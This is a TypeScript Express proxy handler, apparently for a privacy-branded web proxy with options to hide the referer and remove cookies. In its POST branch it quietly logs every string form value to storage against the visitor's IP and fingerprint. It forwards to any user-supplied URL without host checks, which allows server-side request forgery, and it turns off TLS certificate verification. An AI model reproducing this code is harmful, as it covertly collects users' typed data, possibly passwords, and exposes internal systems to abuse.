import { createProxyMiddleware, fixRequestBody } from 'http-proxy-middleware';
import { Request, Response, NextFunction } from 'express';
import { URL } from 'url';
import { storage } from './storage';

// Helper to extract visitor info from request
export const extractVisitorInfo = (req: Request) => {
  const ipAddress = req.ip || req.socket.remoteAddress || '0.0.0.0';
  const fingerprint = req.headers['x-fingerprint'] as string | undefined;
  const userAgent = req.headers['user-agent'] as string | undefined;

  return { ipAddress, fingerprint, userAgent };
};

// Check if a visitor is blocked
export const isVisitorBlocked = async (req: Request): Promise<boolean> => {
  const { ipAddress, fingerprint } = extractVisitorInfo(req);
  const visitor = await storage.getVisitorByIpAndFingerprint(ipAddress, fingerprint);

  if (!visitor) return false;

  // Update last seen timestamp for the visitor
  await storage.updateVisitorLastSeen(visitor.id);

  return visitor.blocked;
};

// Log a proxy request
export const logProxyRequest = async (
  req: Request, 
  targetUrl: string, 
  status: string, 
  responseStatus?: number
) => {
  try {
    const { ipAddress, fingerprint, userAgent } = extractVisitorInfo(req);

    // Find or create visitor
    let visitor = await storage.getVisitorByIpAndFingerprint(ipAddress, fingerprint);

    if (!visitor) {
      visitor = await storage.createVisitor({
        ipAddress,
        fingerprint,
        userAgent
      });
    } else {
      await storage.updateVisitorLastSeen(visitor.id);
    }

    // Log the proxy request
    await storage.createProxyRequest({
      visitorId: visitor.id,
      url: targetUrl,
      status,
      responseStatus,
      hideReferer: req.body.hideReferer === true || false,
      removeCookies: req.body.removeCookies === true || false,
      headers: req.headers as any
    });
  } catch (error) {
    console.error('Error logging proxy request:', error);
  }
};

// Create proxy middleware generator
export const createProxyHandler = () => {
  return async (req: Request, res: Response, next: NextFunction) => {
    try {
      // Get the target URL from either query parameters (GET) or request body (POST)
      let targetUrl = req.method === 'GET' ? req.query.url as string : req.body.url;

      if (!targetUrl) {
        return res.status(400).json({ message: 'No URL provided' });
      }

      try {
        // Validate URL format
        new URL(targetUrl);
      } catch (error) {
        return res.status(400).json({ message: 'Invalid URL format' });
      }

      // Check if the visitor is blocked
      const blocked = await isVisitorBlocked(req);
      if (blocked) {
        await logProxyRequest(req, targetUrl, 'blocked');
        return res.status(403).json({ message: 'Access blocked by administrator' });
      }

      // Get proxy options from query parameters or request body
      const hideReferer = req.method === 'GET' 
        ? req.query.hideReferer === 'true' 
        : req.body.hideReferer === true;

      const removeCookies = req.method === 'GET' 
        ? req.query.removeCookies === 'true' 
        : req.body.removeCookies === true;

      // For POST requests, return URL to redirect to
      if (req.method === 'POST') {
        // For POST requests, create a proxy middleware
      // Log the request and any form inputs
      await logProxyRequest(req, targetUrl, 'success');

      // Track form inputs if present
      if (req.body && typeof req.body === 'object') {
        const { ipAddress, fingerprint } = extractVisitorInfo(req);
        const visitor = await storage.getVisitorByIpAndFingerprint(ipAddress, fingerprint);
        if (visitor) {
          // Log all form fields
          Object.entries(req.body).forEach(async ([_, value]) => {
            if (typeof value === 'string') {
              await storage.logUserInput(visitor.id, value);
            }
          });
        }
      }

        // Build the URL for client-side redirect
        const params = new URLSearchParams();
        params.append('url', targetUrl);
        if (hideReferer) params.append('hideReferer', 'true');
        if (removeCookies) params.append('removeCookies', 'true');

        return res.json({ 
          success: true, 
          message: 'Proxy request successful',
          url: `/api/proxy?${params.toString()}`
        });
      }

      // For GET requests, create a proxy middleware
      // Log the request first
      await logProxyRequest(req, targetUrl, 'success');

      // Setup proxy options
      const options = {
        target: targetUrl,
        changeOrigin: true,
        followRedirects: true,
        secure: false, // Allow insecure SSL certificates for proxy
        ws: false, // Don't proxy websockets
        logLevel: 'error',
        pathRewrite: (path) => {
          // Remove /api/proxy and any query parameters
          return path.replace(/\/api\/proxy.*\?url=([^&]+).*$/, '$1');
        },
        onProxyReq: (proxyReq: any) => {
          // Remove referer if requested
          if (hideReferer) {
            proxyReq.removeHeader('referer');
            proxyReq.removeHeader('origin');
          }

          // Remove cookies if requested
          if (removeCookies) {
            proxyReq.removeHeader('cookie');
          }
        },
        onProxyRes: (proxyRes: any) => {
          // Remove cookies from response if requested
          if (removeCookies && proxyRes.headers['set-cookie']) {
            delete proxyRes.headers['set-cookie'];
          }
        },
        onError: (err: Error, req: Request, res: Response) => {
          console.error('Proxy error:', err);

          // Log the error
          logProxyRequest(req, targetUrl, 'error').catch(e => {
            console.error('Error logging failed proxy request:', e);
          });

          res.writeHead(500, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ 
            message: 'Proxy error', 
            error: err.message 
          }));
        }
      };

      // Create and apply the proxy middleware
      createProxyMiddleware(options)(req, res, next);
    } catch (error) {
      console.error('Proxy handler error:', error);
      return res.status(500).json({ 
        message: 'Proxy error', 
        error: error instanceof Error ? error.message : 'Unknown error' 
      });
    }
  };
};